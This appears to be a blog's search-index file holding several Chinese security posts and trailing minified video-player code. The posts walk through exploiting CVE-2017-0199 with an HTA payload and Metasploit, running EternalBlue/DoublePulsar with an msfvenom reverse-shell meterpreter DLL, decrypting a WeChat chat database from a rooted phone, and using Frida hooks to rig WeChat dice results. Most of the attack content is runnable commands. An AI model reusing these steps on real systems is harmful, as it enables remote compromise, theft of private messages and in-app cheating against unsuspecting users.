ngrok"},{"title":"CVE-2017-0199漏洞复现过程","url":"/2017/04/18/CVE-2017-0199漏洞复现过程/","text":"记录一下过程，周日已经出了结果，但是过程忘记了，抽空再次实现了一下。结尾附上利用MSF生成exploit（外国黑客城会玩）。 准备工作一台apache服务器（这里我用Kali）、POC和一个Word文档。POC内容大概如下： 1234&lt;script&gt;a=new ActiveXObject(\"WScript.Shell\");a.run('%windir%\\\\System32\\\\cmd.exe /c calc.exe', 0);window.close();&lt;/script&gt; Word文档内容任意。 然后将其放在Kali服务器上Apache需要开启DAV支持，具体命令如下 1234a2enmod dav a2enmod dav_fs a2enmod dav_lock a2enmod headers 测试过程在web目录新建ms文件夹，将test.docx复制到ms目录下，并重命名为test.rtf 12root@kali:~/Documents# cp test.docx /var/www/html/ms/test.rtf 新建Word文档，插入对象如图 并保存为rtf文件，如233.rtf删除服务器上的test.rtf文件并将poc.hta文件复制到ms目录下，并改名为test.rtf 12root@kali:/var/www/html/ms# rm -rf test.rtf root@kali:~/Documents# cp poc.hta /var/www/html/ms/test.rtf 修改Apache配置 1234567&lt;Directory /&gt; Dav on &lt;/Directory&gt; &lt;Directory /var/www/html/ms/&gt; Header set Content-Type \"application/hta\" &lt;/Directory&gt; 并重启服务器service apache2 restart 打开233.rtf文档 双击word文档的文字，将会有惊喜弹出 打开文档就弹出的话需要将\\object\\objautlink\\rsltpict修改为\\object\\objautlink\\objupdate\\rsltpict 再次打开文件 彩蛋（MSF下的实现）在kali下执行。首先更新msf到最新。（假设你们都完成了这个过程） 下载利用脚本1root@kali:/usr/share/metasploit-framework/modules/exploits/windows/fileformat# wget https://raw.githubusercontent.com/nixawk/metasploit-framework/3d082814cbedc065f329498b9c6fb7951f8ebbd5/modules/exploits/windows/fileformat/office_word_hta.rb 然后msf下执行命令reload_all重新加载模块 下载rtf文件到/usr/share/metasploit-framework/data/exploits目录 123cd /usr/share/metasploit-framework/data/exploitswget https://raw.githubusercontent.com/nixawk/metasploit-framework/3d082814cbedc065f329498b9c6fb7951f8ebbd5/data/exploits/cve-2017-0199.rtf 开启hta服务123msf &gt; use exploit/windows/misc/hta_servermsf exploit(hta_server) &gt; show optionsmsf exploit(hta_server) &gt; run 生成exploit文档12345msf exploit(hta_server) &gt; use exploit/windows/fileformat/office_word_htamsf exploit(office_word_hta) &gt; show optionsmsf exploit(office_word_hta) &gt; set TARGETURI http://192.168.232.134:8080/4Jmy4cmcZZV7pwi.htamsf exploit(office_word_hta) &gt; set FILENAME msf.docmsf exploit(office_word_hta) &gt; run 将生成的msf.doc文件复制到windows上，打开即可获取一个会话 如下所示 WIndows下结果 Kali下结果 附加如何判断是否受到影响（2017.04.19）新建word文档-&gt;插入-&gt;对象-&gt;对象-&gt;由文件创建在文件名中输入获取的hta链接，并选中链接到文件如果出现如下结果，则说明受到影响 如果仅仅出现下面的弹窗，则说明不受影响，就不需要接下来的测试了。。 主机和虚拟机镜像采用的同一套系统，Office用的也一样，但是虚拟机不可以，而主机可以。我也不知道为啥···· 参考文章http://rewtin.blogspot.nl/2017/04/cve-2017-0199-practical-exploitation-poc.html?m=1https://github.com/rapid7/metasploit-framework/pull/8254","tags":"cve-2017-0199 office漏洞 msf"},{"title":"方程式漏洞利用之SMB","url":"/2017/04/15/方程式漏洞利用之SMB/","text":"测试过程中发现了许多问题，导致不成功，记录一下过程以及在其中遇到问题的解决方法 环境搭建| 主机 | IP |备注||——–|——–|| Win7 64位 | 192.168.232.133 |靶机（开启smb）||XP|192.168.232.128|攻击机1||Kali|192.168.232.134|攻击机2| 攻击机软件安装1.下载https://github.com/x0rz/EQGRP_Lost_in_Translation/tree/master/windows2.安装Python2.6 32位 安装后，运行fb.py，发现错误ImportError: No module named win32pipe 搜索后提示需要安装pywin32-216.win32-py2.6.exe，下载地址https://sourceforge.net/projects/pywin32/files%2Fpywin32/选择对应的版本。结果又发现错误 切换到Python的安装目录的Scripts下，执行命令pywin32_postinstall.py -install 运行fb.py报错，在fb.py同目录下创建listeningposts文件夹即可 验证过程运行fb.py后输入靶机和攻击机XP的IP，新建或者用之前的项目之后一路回车，需要操作的地方已经标记选择SMB工具模块，使用命令use Eternalblue选择目标系统输入命令use Doublepulsar 在Kali上生成dll文件，命令如下 1msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.134 LPORT=5555 -f dll &gt; s.dll 然后copy到XP系统中，记下位置，如C:\\s.dllkali上运行msf，具体命令如下 12345678msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; set LHOST 192.168.232.134LHOST =&gt; 192.168.232.134msf exploit(handler) &gt; set LPORT 5555LPORT =&gt; 5555msf exploit(handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcpPAYLOAD =&gt; windows/x64/meterpreter/reverse_tcpmsf exploit(handler) &gt; exploit 在XP上输入dll文件的位置，一路回车显示Doublepulsar Succeeded 查看kali上发现已经反弹shell 了 结束语现在网上已经有很多文章了，这里只是自己验证一下实现的过程，记录一下。其实复现也很容易，只需要输入IP地址和一些选项即可，就是搭建环境的时候有许多错误，注意一下就行了。这里有视频可以看一下https://v.qq.com/iframe/player.html?vid=g0393qtgvj0&amp;tiny=0&amp;auto=0","tags":"方程式 smb漏洞"},{"title":"QQ登录简单分析，附易语言登录代码","url":"/2017/04/10/QQ登录简单分析，附易语言登录代码/","text":"这里参考了QQ登录的组件 1http://ui.ptlogin2.qq.com/cgi-bin/login?hide_title_bar=0&amp;low_login=0&amp;qlogin_auto_login=1&amp;no_verifyimg=1&amp;link_target=blank&amp;appid=636014201&amp;target=self&amp;s_url=http%3A//www.qq.com/qq2012/loginSuccess.htm QQ登录有两种情况，一种是需要验证码，一种是不需要验证码。需要验证码的稍微复杂一点，这里首先介绍一下不需要验证码的情况。 一、无需验证码第一步：获取 login_sig这是登录所需要的第一步，无论是否需要验证码，都需要进行这一步。访问如下地址： 1http://ui.ptlogin2.qq.com/cgi-bin/login?hide_title_bar=0&amp;low_login=0&amp;qlogin_auto_login=1&amp;no_verifyimg=1&amp;link_target=blank&amp;appid=636014201&amp;target=self&amp;s_url=http%3A//www.qq.com/qq2012/loginSuccess.htm 从返回的Cookie中获取 pt_login_sig的值，这个值就是login_sig 第二步：获取 checkVC这个字符串中包含了多个内容。有是否输入验证码的标志、verifycode、salt和pt_verifysession_v1（不需要输入验证码的情况下）。请求地址： 1http://check.ptlogin2.qq.com/check?regmaster=&amp;pt_tea=2&amp;pt_vcode=1&amp;uin=QQ号码&amp;appid=636014201&amp;js_ver=10197&amp;js_type=1&amp;login_sig=GsmtnCcla5xHKS********T0U0npqlnD4bzXEMed&amp;u1=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm&amp;r=0.23528769960244944&amp;pt_uistyle=40 其中参数uin是登录的qq号码，login_sig是从第一步获取的值。当然这种情况是在QQ号输入正确，并且不需要输入验证码时。返回的内容如下： 1ptui_checkVC(&#39;0&#39;,&#39;!BAF&#39;,&#39;\\x00******\\x64\\x21\\x97\\x92&#39;,&#39;e9825f1e232302e01414bf9c37ac7d44942a40c89daaf5604ab11d54fff32445ad89e315e30a610e0aa77f46afedbaad83819c14230e7ec2&#39;,&#39;2&#39;); 第一个值表示是否需要图片验证码，0表示不需要 第二值是verifycode，登录时需要 第三个值是salt，QQ转换而来 第四个值是pt_verifysession_v1 第三步：登录输入密码后点登录，请求包为： 1http://ptlogin2.qq.com/login?u=QQ号码&amp;verifycode=!BAF&amp;pt_vcode_v1=0&amp;pt_verifysession_v1=e9825f1e232302e01414bf9c37ac7d44942a40c89daaf5604ab11d54fff32445ad89e315e30a610e0aa77f46afedbaad83819c14230e7ec2&amp;p=w79Tqqx2glOF9meNNWhz5Ouow23EGt3zEl-y8vpVGFuHT6HJaFtRhVDlbpMj4a6plyrnIvW73uGXzVDwSt2e9wMHyFt9crtZ-N0xUx2wxFUen03ybw5HxzkPti3VyjSffID8GNkhDn1yYVPa1lyjHED2DCVd3rl9bysBPb*1imLSYY3jkQJpsXPS2kjxxlVxFBVHEHnSGSYaA3QBMXQ*NyQw7MkhVDsO7X8aljR0eApa*lgHoBsC4g3mTtEKcU5aslpcO4EPdUey0QA4YVh9zLzbLnkPJklcQYvoxlv6kLdYmoyORcVTM6IKqles7t5ot0mRWzjW923hV3X0PLRb6g__&amp;pt_randsalt=2&amp;u1=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm&amp;ptredirect=0&amp;h=1&amp;t=1&amp;g=1&amp;from_ui=1&amp;ptlang=2052&amp;action=4-8-1488010172151&amp;js_ver=10197&amp;js_type=1&amp;login_sig=GsmtnCcla5xHKSrRZ7ek0VU5-63oyUvqLk65vxoIG0kOFBT0U0npqlnD4bzXEMed&amp;pt_uistyle=40&amp;aid=636014201&amp; 参数名称 说明 u 用户输入。第二步骤中 uin的值 verifycode 第二步中ptui_checkVC第二个值。(这里的是!BAF) pt_verifysession_v1 第二步中ptui_checkVC第四个值。即e9825f1…. p 加密后的密码 login_sig 第一步中返回Cookie中的 pt_login_sig值 pt_randsalt pt_randsalt=0 旧版加密 ；pt_randsalt=2 新版RSA加密 密码加密的js代码地址http://imgcache.qq.com/ptlogin/ver/10197/js/c_login_2.js，注意看js版本，这里是js_ver为10197 密码加密需要三个参数，第一个是pwd（用户密码），第二个是salt（第二步中获取ptui_checkVC 中的第三个值），第三个是verifycode（第二步中ptui_checkVC第二个值 ） 用户名密码正确返回： 1ptuiCB(&#39;0&#39;,&#39;0&#39;,&#39;http:&#x2F;&#x2F;www.qq.com&#x2F;qq2012&#x2F;loginSuccess.htm&#39;,&#39;0&#39;,&#39;登录成功！&#39;, &#39;QQ昵称&#39;); 用户名密码错误返回： 1ptuiCB(&#39;3&#39;,&#39;0&#39;,&#39;&#39;,&#39;0&#39;,&#39;您输入的帐号或密码不正确，请重新输入。&#39;, &#39;&#39;); 附上一张登录成功的截图 二、需要输入验证码第一步：获取login_sig与上面无需验证码一样，就省略了。 第二步：获取cap_cd请求： 1http://check.ptlogin2.qq.com/check?regmaster=&amp;pt_tea=2&amp;pt_vcode=1&amp;uin=987654321&amp;appid=636014201&amp;js_ver=10197&amp;js_type=1&amp;login_sig=KVSX9JmFKqCXlNi85SLXJnj5DqKPDzAYGwW3X5d3Wcnxd885YPFSeDU7ul15aTQp&amp;u1=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm&amp;r=0.8539291708517738&amp;pt_uistyle=40 返回 1ptui_checkVC(&#39;1&#39;,&#39;yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**&#39;,&#39;\\x00\\x00\\x00\\x00\\x3a\\xde\\x68\\xb1&#39;,&#39;&#39;,&#39;2&#39;); cap_cd的值为yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w** 第三步：获取sess请求： 1http://captcha.qq.com/cap_union_new_gettype?aid=636014201&amp;asig=&amp;captype=&amp;protocol=http&amp;clientype=2&amp;disturblevel=&amp;apptype=2&amp;curenv=inner&amp;uid=987654321&amp;cap_cd=yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**&amp;lang=2052&amp;callback=_aq_453849 uid是qq号，cap_cd由第二步获取 返回： 1_aq_453849(&#123;&quot;capclass&quot;:&quot;0&quot;,&quot;subcapclass&quot;:&quot;0&quot;,&quot;src&quot;:&quot;cap_union_new_show&quot;,&quot;sess&quot;:&quot;XiUr_hV-3RVfwQc2_01i1vZOI3BJdVr8AfA3-ZYIFztXD58CSfYICY_kwrJjpmvRtuAfMX50sJGC0c0D8W2kig**&quot;&#125;) 第四步：获取visg请求： 1http://captcha.qq.com/cap_union_new_show?aid=636014201&amp;asig=&amp;captype=&amp;protocol=http&amp;clientype=2&amp;disturblevel=&amp;apptype=2&amp;curenv=inner&amp;sess=XiUr_hV-3RVfwQc2_01i1vZOI3BJdVr8AfA3-ZYIFztXD58CSfYICY_kwrJjpmvRtuAfMX50sJGC0c0D8W2kig**&amp;noBorder=noborder&amp;showtype=embed&amp;uid=987654321&amp;cap_cd=yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**&amp;lang=2052&amp;rnd=925999 第五步：获取图片验证码访问地址： 1http://captcha.qq.com/cap_union_new_getcapbysig?aid=549000912&amp;asig=&amp;captype=&amp;protocol=http&amp;clientype=2&amp;disturblevel=&amp;apptype=2&amp;curenv=inner&amp;sess=” ＋ sess ＋ “&amp;noBorder=noborder&amp;showtype=embed&amp;uid=” ＋ uin ＋ “&amp;cap_cd=” ＋ cap_cd ＋ “&amp;lang=2052&amp;rnd=117715&amp;rand=0.5497459754332915&amp;vsig=” ＋ vsig ＋ “&amp;ischartype=1 第六步：验证验证码，获取verifycode和pt_verifysession_v1post请求：http://captcha.qq.com/cap_union_new_verify?random=1488013134675 提交内容： 1aid=636014201&amp;asig=&amp;captype=&amp;protocol=http&amp;clientype=2&amp;disturblevel=&amp;apptype=2&amp;curenv=inner&amp;sess=XiUr_hV-3RVfwQc2_01i1vZOI3BJdVr8AfA3-ZYIFztXD58CSfYICY_kwrJjpmvRtuAfMX50sJGC0c0D8W2kig**&amp;noBorder=noborder&amp;showtype=embed&amp;uid=QQ号码&amp;cap_cd=yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**&amp;lang=2052&amp;rnd=925999&amp;subcapclass=0&amp;vsig=g3GflfnCicbaqub3e-SVo2azImuo1gDzQfnGkRnhI-uqLlIXtY6XyXE1dDjUBJHOXCPewnnTo-4mPTtRjScTD9uZaPu4z3x1Jj6inepPQ8l8KCeFeN9laBpiWdqaOF4Eg&amp;cdata=0&amp;collect=OD6q9t0AraWJf%2Bdtq0j8VvuOrjmT8T%2F%2FW8E83RE208unUG0TO1T5psMsZH1p5SXS12WpjU2CcGKHMsp7fciMTLiLY3wUwJBjBxWSqfu%2FbhfCTKUtJdBPeE6P%2FsRfdwemWRYRQwRgdvXZuc42JOqfDIfD%2F2%2B2GeYYxOPohbqY%2BWcW%2Fcut%2BGLcKpJGFTzBtPzKDLU6fTPn6MC%2FNiRGWGehwTy52MK0dIVdd5BYlPQrhFrvrhaisRISHiH%2FhViF7iFpZm5ZclBD5rjqQ4r1O8%2BBDRSB4feMaP2S1Usd0uGrMnVFT8zX7dV7sT2Y1NQ%2Fk5%2FHP%2BgzBQgHMLuH%2FqdSBz%2Fu9wr7oT6Xb0edOUBjPrw55yhZM1R%2FxEJSNwap2f77XRxbJWH%2BFtEuWBC2Gve3MIn9L9loCqk%2Fe0XoGGy%2FuEDvHfEHRCchzaWKH3Hlr5MehOI4WaaPgmbj%2BBeSbcY%2BmDIc1TJ%2BhQmsRf5DoqlqiCuKNQLuX1XS1e3cnfM3%2BonkBImxaqx%2BlTG0HxWAV0Ntsn%2B0%2BeErZleVNI9VIZgIOHDxNkiaG3BucPL1SRuPNtgcNgGFpvYmFqTqPrR%2FgYDPobzlxy%2FcMVEALYB%2FogbH4gy%2FZP7xczjXypgdvtTawokxTUopmKyXVCwvA0coEQzWLW1EQfMsWPNZcA2p58oaelGA3FBlgkZ2iUnx4qukKEZQ7vKFie8VKFBelfNSp6aXcezYbnDbeFHYOAvLeXPriaZ5qBQzNADUtyj%2FhTsY%2BbvmnwCAGT%2F%2BMYeyd9VFWPEbR8cj%2FrRDEEWc0wdd5BOoHzix%2Bz2Uif9512VwHn9%2Bp3KXAnrK1O%2FQ6HRB7YS9BPyYQvW9ZtpvvKBwOIjf3fx7aqwYqfa7VUzMGv3zkvVA8Bp2JHG2GoQxnVa62ymP3SGshxS4l86ParjFNvepN16O1VaPAidFvqHRXAP14tHMkeC8VTFuqp5cKAY4UdXpPXukOvXPySbdFSPaaAqfIv7%2BckjxFsUPS4cauOx2jif2fQU2maxErLnwrZ10natNklynu5sUn9RSuRDld9v4TNTbyPShDdijM%2BzvpJoMyr4GWiFthB0kZZ2lVnPoqV67VQ%2FPiyCUA9zVbrLSAEOKIz1HQ19I0hdH41fBUPL824xYMdIO1AlZJKGre%2FCvUEgXaHgvbe83QNtFw%2BU946tlGVwR9TCCPltakqyKrT%2F8CtCZ6Mi0qfmFYnF8D7zZBaKxbNgTmMjvwAyz%2F0dMsDi97scJLMYV4w%2Fosk6gvoHEeX6LkbXh5W0aTYTznTSfO2RVfgzWpPiks6rVGzLhfwDyFAyH7%2FOHD7qEWGjnX3fTiBnw5%2FHWqHPJh3Kd%2F4EGe1yE3ZGzxo%2BPETGbcLQaQiiSAaQiFsU5UDoWG1%2FfOjd1Lkjg8D%2FNXuS1BkncxI2Hk%2B4xL0Xa1STqWJGieeyB5DOT9cHYUxEpw1g%3D&amp;ans=ywhm 验证码输入正确返回： 1&#123;\"errorCode\":\"0\" , \"randstr\" : \"@mDo\" , \"ticket\" : \"t026Dii9p2HtKBiYgHwRpwqXFrwWsI3-tta5rc7J3ELr5VgnaORdHXceHsZpmOl6JGRkEQYtUoeJs8KXWym7a0cxuw07929umE9cPo16UNyimo*\" , \"errMessage\":\"OK\"&#125; verifycode为randstr，pt_verifysession_v1为ticket 第七步： 验证用户名密码是否正确请求： 1http://ptlogin2.qq.com/login?u=987654321&amp;verifycode=@mDo&amp;pt_vcode_v1=1&amp;pt_verifysession_v1=t026Dii9p2HtKBiYgHwRpwqXFrwWsI3-tta5rc7J3ELr5VgnaORdHXceHsZpmOl6JGRkEQYtUoeJs8KXWym7a0cxuw07929umE9cPo16UNyimo*&amp;p=A*CEx2PsoaZAYQe7D-5dLmTxdorqI9asO37Wugp2KFHzeEqYpMPh9CHPk7DDzZw5UzD4y1in-ZrSoXLx5kJYe1WGZ7sqhg*ZNJ3DtQ65rXR*I5i*dCAQ-h1fFV*u3AdP8IFAAu*borH*xSYbFZDTQ8TjplD2wan2w8MnDfo3h1AyUL*kpt79FqpCfuXnlaSOyTOzkMceEQczxw5DYzmZDetbMeJMYhoqLhQ0WHxbHUafhOEk1EhBDiqXvfETJvCmSMubGN7W*LIF3JPoYFDOgJmmPWqauGvw7C03ehesfIzeNtm-m5R*QX8HyM4dPp*dc3lRUxF2rMuBPn9EVzaqpg__&amp;pt_randsalt=2&amp;u1=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm&amp;ptredirect=0&amp;h=1&amp;t=1&amp;g=1&amp;from_ui=1&amp;ptlang=2052&amp;action=5-24-1488013134992&amp;js_ver=10197&amp;js_type=1&amp;login_sig=KVSX9JmFKqCXlNi85SLXJnj5DqKPDzAYGwW3X5d3Wcnxd885YPFSeDU7ul15aTQp&amp;pt_uistyle=40&amp;aid=636014201&amp; 带验证码登录可能存在问题，待修改 易语言实现代码","tags":"qq登录 易语言"},{"title":"微信聊天记录读取","url":"/2017/04/09/微信聊天记录读取/","text":"根据四哥教程来自己动手实现一下如何读取微信的聊天记录。以下操作需要在手机Root的情况下进行。 微信聊天记录保存位置微信聊天记录的数据库文件保存在/data/data/com.tencent.mm/MicroMsg/32位字符串/中，名字为EnMicroMsg.db。 将聊天记录数据库文件导出使用命令： 1adb pull /data/data/com.tencent.mm/MicroMsg/32位字符串/EnMicroMsg.db 直接导出提示不存在，因为是权限的问题。使用adb root没反应，只好将文件copy到一个非root权限可以操作的目录，这里采用了/data/local/tmp文件夹。 1cp EnMicroMsg.db /data/local/tmp/ 然后导出，执行命令adb pull /data/local/tmp/EnMicroMsg.db 提示权限不足，修改权限后导出。 查看SharedPreferences中保存的UIN的值切换到/data/data/com.tencent.mm/shared_prefs目录，然后执行grep -rn &quot;uin&quot; *来查看保存的UIN的值 读取微信数据库文件内容将手机的IMEI和微信用户UIN值进行拼接后进行md5加密，取小写md5的前七位就是微信数据库的密码。用Navicat读取数据库文件是提示错误：这是因为微信数据库用的是SQLCipher开源库提供的加密解密算法，读取数据库文件需要使用SQLCipher这个软件。打开后输入密码，即可看到聊天内容： 参考资料http://blog.csdn.net/jiangwei0910410003/article/details/52238891","tags":"微信聊天记录"},{"title":"Android HOOK 技术之Frida的初级使用","url":"/2017/04/01/Android-HOOK-技术之Frida的初级使用/","text":"Frida是一款基于Python + JavaScript 的Hook与调试框架，在Android\\Linux\\Windows等平台均能使用。这里我们以Windows来对Android应用程序进行Hook。Frida的官网地址是：https://www.frida.re。 Windows下Frida的安装 有多种安装方法，这里提供两种，第一种直接使用pip安装，第二种是下载egg文件安装 1.通过pip安装Frida1pip install frida 2.去下载对应平台的egg安装包进行安装下载地址：https://pypi.python.org/pypi/frida当前最新版本为9.1.23，下载对应平台和Python版本的安装包，例如我的系统为Win64，Python为2.7，下载的文件为frida-9.1.23-py2.7-win-amd64.egg。下载后安装即可。 由于网络原因，方法1安装时间太久，这里推荐第二种方法。 安装完成后在Dos窗口输入命令： 1frida-ps 出现类似以下的界面表示安装成功。 Android下Frida环境的搭建 要求：一部Root过的手机或模拟器，最好采用4.4 ARM系统。PS：我真机采用的是魅族4的5.1系统，有些功能实现不了，只好用模拟器来完成。模拟器的具体配置如下图所示。 首先需用下载最新的frida-server，下载地址为：http://build.frida.re/frida-snapshot/android/arm/bin/frida-server。下载后将文件上传到手机中，并赋予执行权限。上传到手机使用如下命令： 1adb push frida-server &#x2F;data&#x2F;local&#x2F;tmp&#x2F; ![adb push](adb push.png) 将frida-server赋予执行权限，命令如下： 1234adb shellsucd &#x2F;data&#x2F;local&#x2F;tmp&#x2F;chmod 777 frida-server 运行Frida-Server 1.&#x2F;data&#x2F;local&#x2F;tmp&#x2F;frida-server 执行frida-ps -U可以看到手机上的进程 使用frida-ps -R 也可以，但是需要进行转发。执行adb forward tcp:27042 tcp:27042后执行frida-ps -R也可以看到手机上的进程 至此，准备工作已经做好，现在来进行对Android上的程序进行Hook了。首先以WX的掷骰子和猜拳头为例。这里采用最新版的WX（6.5.7）。其代码如下所示： 123456789101112131415161718192021222324252627282930313233# -*- coding: utf-8 -*import frida, sysdef on_message(message, data): if message['type'] == 'send': print(\"[*] &#123;0&#125;\".format(message['payload'])) else: print(message)jscode = \"\"\"Java.perform(function () &#123;var be= Java.use(\"com.tencent.mm.sdk.platformtools.bf\");send(\"start\")be.da.implementation = function()&#123; var type = arguments[0]; send(type);//5表示掷骰子，2表示猜拳头 if(type ==2)&#123; return 1;//表示是石头 &#125;else&#123; return 5;//骰子6点 &#125;&#125;;send(\"end\")&#125;);\"\"\"process = frida.get_usb_device().attach('com.tencent.mm')script = process.create_script(jscode)script.on('message', on_message)print('[*] weixin Start...')script.load()sys.stdin.read() 手机上打开微信后，运行代码。然后点击掷骰子，可以看到都是6点，猜拳头全部是石头。 下面来用一个例子来介绍一下，如何来通过Hook的方法修改原来的内容，以及当出现相同方法名时，如何对该方法进行Hook。其Android的Activity代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465package com.test.fridatest;import android.app.Activity;import android.os.Bundle;import android.util.Log;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.Toast;public class MainActivity extends Activity &#123; private Button myButton1; private String TAG = \"fuping\"; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); myButton1 = (Button) findViewById(R.id.button1); myButton1.setOnClickListener( new ButtonClick()); &#125; class ButtonClick implements OnClickListener &#123; public void onClick(View v) &#123; switch (v.getId()) &#123; case R.id.button1: int nRet = test(4); String strRet = nRet + \"\"; Toast.makeText(MainActivity.this, strRet,Toast.LENGTH_LONG).show(); Log.i(TAG, \"test(int):\"+ strRet); strRet = test(4,2)+\"\"; Log.i(TAG, \"test(int,int):\"+ strRet); strRet = test(4,\"2\")+\"\"; Log.i(TAG, \"test(int,String):\"+ strRet); strRet = change(4,\"2\")+\"\"; Log.i(TAG, \"change(int,String):\"+ strRet); break; default: break; &#125; &#125; &#125; public int test(int num) &#123; int nRet = num*2; return nRet; &#125; public int test(int num,int b) &#123; int nRet = num*2 + b ; return nRet; &#125; public String test(int num,String b) &#123; String nRet = num*2 + b ; return nRet; &#125; public String change(int num,String b) &#123; String nRet = num*2 + b ; return nRet; &#125; &#125; 首先演示一下对change方法的hook。hook之前change方法输出的结果为82，预期Hook之后输出的结果应该为164。在真机上运行结果如下所示： 发现Hook之后返回的是null，而且报错。（经过多次给手机系统升级或降级，都无法成功，最后之后在模拟器上测试了） 在模拟器上进行Hook后，出现了预期的结果。在对test方法进行hook时，由于有多个test方法，所以在进行Hook时，需要指定是哪个方法。例如对String test(int num,String b)进行hook时，可以使用如下代码 12345var TM = Java.use(\"com.test.fridatest.MainActivity\");TM.test.overload(\"int\",\"java.lang.String\").implementation = function (a,b) &#123; send(\"Called - test(int,String):\"+a+\"----\"+b); return this.test.overload(\"int\",\"java.lang.String\").call(this,8,\"3\");&#125;; 附上对test和change同时hook 的结果： 就个人而言，针对Frida和Xposed相比，Frida操作更简单，而且不需要重启手机。但相关资料较少，还是需要慢慢学习。 参考资料 https://www.frida.re/docs/examples/android/ https://www.codemetrix.net/hacking-android-apps-with-frida-1/ http://www.cnblogs.com/konf/p/5998785.html","tags":"安卓hook frida 摇骰子"},{"title":"Hello World","url":"/2017/03/20/hello-world/","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new blog1$ hexo init Create a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment Question运行hexo server，浏览器输入http://localhost:4000 无法访问 产生原因可能是端口占用。 Windows下运行命令netstat -ano | findstr 4000，看是否有有进程占用了4000端口。 这是安装了福昕PDF阅读器的原因，将Foxitprotect.exe进程结束即可。 安装主题1git clone https://github.com/litten/hexo-theme-yilia.git themes/yilia 修改hexo根目录下的 _config.yml ： theme: yilia 之后运行 12hexo ghexo s 修改头像hexo根目录下source文件夹中新建assets\\img文件夹，将头像文件复制进去修改主题目录中的_config.yml ：avatar: /assets/img/avatar.jpg 添加标签1.添加标签1tag: 标签 2.添加多个标签1tags: [标签1,标签2,标签3] 或者： 123tags: - 标签1 - 标签2 文章部分显示使用&lt;!-- more --&gt;标签来隐藏其下面的内容~","tags":"教程 主题"},{"title":"搜索","url":"/search/index.html","text":"","tags":""},{"title":"","url":"/js/ckplayer/hls/hls.min.js","text":"!function(e){if(\"object\"==typeof exports&&\"undefined\"!=typeof module)module.exports=e();else if(\"function\"==typeof define&&define.amd)define([],e);else{var t;t=\"undefined\"!=typeof window?window:\"undefined\"!=typeof global?global:\"undefined\"!=typeof self?self:this,t.Hls=e()}}(function(){var e;return function e(t,r,i){function a(s,o){if(!r[s]){if(!t[s]){var l=\"function\"==typeof require&&require;if(!o&&l)return l(s,!0);if(n)return n(s,!0);var u=new Error(\"Cannot find module '\"+s+\"'\");throw u.code=\"MODULE_NOT_FOUND\",u}var d=r[s]={exports:{}};t[s][0].call(d.exports,function(e){var r=t[s][1][e];return a(r?r:e)},d,d.exports,e,t,r,i)}return r[s].exports}for(var n=\"function\"==typeof require&&require,s=0;s0&&this._events[e].length>r&&(this._events[e].warned=!0,console.trace),this},i.prototype.on=i.prototype.addListener,i.prototype.once=function(e,t){function r(){this.removeListener(e,r),i||(i=!0,t.apply(this,arguments))}if(!a(t))throw TypeError(\"listener must be a function\");var i=!1;return r.listener=t,this.on(e,r),this},i.prototype.removeListener=function(e,t){var r,i,n,o;if(!a(t))throw TypeError(\"listener must be a function\");if(!this._events||!this._events[e])return this;if(r=this._events[e],n=r.length,i=-1,r===t||a(r.listener)&&r.listener===t)delete this._events[e],this._events.removeListener&&this.emit(\"removeListener\",e,t);else if(s(r)){for(o=n;o-- >0;)if(r[o]===t||r[o].listener&&r[o].listener===t){i=o;break}if(in||n===1/0||isNaN(n))&&(c.logger.log(\"Updating mediasource duration to \"+i.toFixed(3)),this._msDuration=t.duration=i)}}},{key:\"doFlush\",value:function(){for(;this.flushRange.length;){var e=this.flushRange[0];if(!this.flushBuffer(e.start,e.end,e.type))return void(this._needsFlush=!0);this.flushRange.shift(),this.flushBufferCounter=0}if(0===this.flushRange.length){this._needsFlush=!1;var t=0,r=this.sourceBuffer;try{for(var i in r)t+=r[i].buffered.length}catch(e){c.logger.error(\"error while accessing sourceBuffer.buffered\")}this.appended=t,this.hls.trigger(u.default.BUFFER_FLUSHED)}}},{key:\"doAppending\",value:function(){var e=this.hls,t=this.sourceBuffer,r=this.segments;if(Object.keys(t).length){if(this.media.error)return this.segments=[],void c.logger.error(\"trying to append although a media error occured, flush segment and abort\");if(this.appending)return;if(r&&r.length){var i=r.shift();try{var a=i.type,n=t[a];n?n.updating?r.unshift(i):(n.ended=!1,this.parent=i.parent,n.appendBuffer(i.data),this.appendError=0,this.appended++,this.appending=!0):this.onSBUpdateEnd()}catch(t){c.logger.error(\"error while trying to append buffer:\"+t.message),r.unshift(i);var s={type:h.ErrorTypes.MEDIA_ERROR,parent:i.parent};if(22===t.code)return this.segments=[],s.details=h.ErrorDetails.BUFFER_FULL_ERROR,s.fatal=!1,void e.trigger(u.default.ERROR,s);if(this.appendError?this.appendError++:this.appendError=1,s.details=h.ErrorDetails.BUFFER_APPEND_ERROR,this.appendError>e.config.appendErrorMaxRetry)return c.logger.log(\"fail \"+e.config.appendErrorMaxRetry+\" times to append segment in sourceBuffer\"),r=[],s.fatal=!0,void e.trigger(u.default.ERROR,s);s.fatal=!1,e.trigger(u.default.ERROR,s)}}}}},{key:\"flushBuffer\",value:function(e,t,r){var i,a,n,s,o,l,u=this.sourceBuffer;if(Object.keys(u).length){if(c.logger.log(\"flushBuffer,pos/start/end: 